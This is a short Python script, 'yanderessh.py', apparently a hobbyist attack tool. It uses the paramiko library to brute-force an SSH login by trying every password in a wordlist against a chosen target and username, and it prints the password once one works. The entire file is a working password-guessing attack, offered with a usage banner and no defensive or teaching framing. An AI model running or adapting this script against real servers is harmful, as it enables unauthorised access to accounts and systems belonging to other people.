#!/usr/bin/python
import paramiko,sys

if len(sys.argv) != 4:
  print ("########### LIL DIX - YANDERESSH ###########")
  print ("- - - - - -  - - -  - - - - - - - - - - - - -")
  print ("Example: python3 yanderessh.py target user wordlist.txt")
  sys.exit()

target = sys.argv[1]
user = sys.argv[2]

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

file = open(sys.argv[3])

for word in file.readlines():
  passw = word.strip()

  try:
     ssh.connect(target, username=user, password=passw)
     
  except paramiko.ssh_exception.AuthenticationException:
      print ('Testing With',passw)
  else:
      print ('[+] == PASSWORD FOUND ==',passw)
      break


ssh.close()
